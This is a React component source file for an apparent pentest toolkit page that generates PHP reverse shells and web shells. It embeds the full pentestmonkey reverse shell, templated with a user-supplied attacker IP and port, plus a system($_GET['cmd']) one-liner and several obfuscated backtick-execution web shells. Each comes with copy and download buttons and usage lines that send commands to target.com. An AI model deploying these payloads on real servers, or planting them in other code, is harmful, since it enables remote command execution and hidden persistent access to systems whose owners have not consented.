import React from 'react';
import PersistedState from 'use-persisted-state';
import { Input, Button, message, Typography, Row, Col, Divider, Collapse } from 'antd';
import {
    CopyOutlined,
    WifiOutlined,
    DownloadOutlined,
    ArrowsAltOutlined,
    createFromIconfontCN
} from '@ant-design/icons';
import QueueAnim from 'rc-queue-anim';
import Clipboard from 'react-clipboard.js';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';
import pretty from 'pretty';

const { Title, Paragraph, Text } = Typography;
const { Panel } = Collapse;
const IconFont = createFromIconfontCN( {
    scriptUrl: [ './iconfont.js' ]
} );

export default function PhpReverseShell () {
    const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );
    const [ values, setValues ] = useIPv4State( {
        ip: 'A.B.C.D',
        port: '1111',
    } );
    const handleChange = ( name: string ) => ( event: { target: { value: string; }; } ) => {
        setValues( { ...values, [ name ]: event.target.value } );
    };
    const successInfoReverseShell = () => {
        message.success( 'Your reverse shell has been copied successfully !' );
    };
    const oneLiner = `<?php system($_GET["cmd"]);?>`;
    const shell_obfuscate =
        `<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
        "${$_}['_'^'o'];echo`$_`?>";
    const shell_obfuscate_function =
        `<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` + "<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";

    const phpReverseShell = `
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '${ values.ip }';  // You have changed this
  $port = ${ values.port };  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string\n";
    }
  }

  ?> 
  `;
    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                PHP Reverse Shell
            </Title>
            <Paragraph style={{ margin: 15 }}>
                Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to
                obtain an interactive shell session on the target machine and continue their attack.
            </Paragraph>
            <div style={{ padding: 15 }}>
                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                    <Col span={12}>
                        <Input
                            maxLength={15}
                            prefix={<WifiOutlined />}
                            name='Ip adress'
                            placeholder='IP Address or domain (ex: 212.212.111.222)'
                            onChange={handleChange( 'ip' )}
                            value={values.ip}
                        />
                    </Col>
                    <Col span={12}>
                        <Input
                            maxLength={5}
                            prefix={<IconFont type='icon-Network-Plug' />}
                            name='Port'
                            placeholder='Port (ex: 1337)'
                            onChange={handleChange( 'port' )}
                            value={values.port}
                        />
                    </Col>
                </Row>
            </div>
            <Divider orientation='center'>Pentestmonkey's reverse shell</Divider>
            <div
                key='a'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>This script will make an outbound TCP connection to a hardcoded IP and port.</Paragraph>
                <Collapse defaultActiveKey={[ '0' ]}>
                    <Panel header='View the souce code' key='1'>
                        <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                            {pretty( phpReverseShell )}
                        </SyntaxHighlighter>
                        <Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
                            <a
                                href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
                                target='_blank'
                                rel='noreferrer noopener'
                            >
                                <ArrowsAltOutlined style={{ marginRight: 10 }} />
                                Pentestmonkey's repository
                            </a>
                        </Button>
                    </Panel>
                </Collapse>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ phpReverseShell ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'reverseShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Clipboard component='a' data-clipboard-text={phpReverseShell}>
                    <Button
                        type='dashed'
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                        onClick={successInfoReverseShell}
                    >
                        <CopyOutlined />
                        Copy
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation="center">Basic RCE</Divider>
            <div
                key='b'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    When you have successfully uploaded your payload, just put your commands after the variable ?cmd=
                    (ex: ?cmd=ls -la")
                </Paragraph>
                <Paragraph><pre><Text copyable>{oneLiner}</Text></pre></Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ oneLiner ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'basicRCE.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined />
                    Download
                </Button>
                <Clipboard component='a' data-clipboard-text={oneLiner}>
                    <Button
                        type='dashed'
                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                        onClick={successInfoReverseShell}
                    >
                        <CopyOutlined />
                        Copy
                    </Button>
                </Clipboard>
            </div>
            <Divider orientation="center">Web Shell</Divider>
            <div
                key='c'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph>
                    p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands
                    on a server when pentesting a PHP application.
                </Paragraph>
                <Collapse defaultActiveKey={[ '0' ]}>
                    <Panel header='Watch the preview' key='1'>
                        <img
                            src='https://i.imgur.com/ALPFDj0.png'
                            alt='pownyShell'
                            style={{ height: '100%', width: '100%' }}
                        />
                    </Panel>
                </Collapse>
                <Button type='primary' style={{ marginBottom: 10, marginTop: 15 }}>
                    <a
                        href='https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php'
                        target='_blank'
                        rel='noopener noreferrer'
                    >
                        <DownloadOutlined /> Download
                    </a>
                </Button>
                <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                    <a href='https://github.com/flozz/p0wny-shell' target='_blank' rel='noopener noreferrer'>
                        <ArrowsAltOutlined /> Flozz's repository
                    </a>
                </Button>
            </div>
            <Divider orientation="center">Obfuscated PHP Web Shell</Divider>
            <div
                key='d'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{'<?=`$_GET[0]`?>'}</Text></pre></Paragraph>
                <Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ '<?=`$_GET[0]`?>' ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'obfuscateShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div>
            <div
                key='e'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{'<?=`$_POST[0]`?>'}</Text></pre></Paragraph>
                <Paragraph>{' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '}</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ '<?=`$_POST[0]`?>' ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'obfuscateShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div>
            <div
                key='f'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{"<?=`{$_REQUEST['_']}`?>"}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
                <Paragraph>- curl -X POST http://target.com/path/to/shell.php -d "_=command" '</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ "<?=`{$_REQUEST['_']}`?>" ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'obfuscateShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
            <div
                key='f'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{shell_obfuscate}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ shell_obfuscate ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'obfuscateShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
            <div
                key='g'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Paragraph><pre><Text copyable>{shell_obfuscate_function}</Text></pre></Paragraph>
                <Paragraph>Usage :</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=function&__=argument</Paragraph>
                <Paragraph>- http://target.com/path/to/shell.php?_=system&__=ls</Paragraph>
                <Button
                    type='primary'
                    style={{ marginBottom: 10, marginTop: 15 }}
                    onClick={() => {
                        const element = document.createElement( 'a' );
                        const file = new Blob( [ shell_obfuscate_function ], {
                            type: 'text/plain'
                        } );
                        element.href = URL.createObjectURL( file );
                        element.download = 'obfuscateShell.php';
                        document.body.appendChild( element );
                        element.click();
                    }}
                >
                    <DownloadOutlined /> Download
                </Button>
                <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
                        <CopyOutlined /> Copy
                    </Button>
                </Clipboard>
            </div >
        </QueueAnim >
    );
};
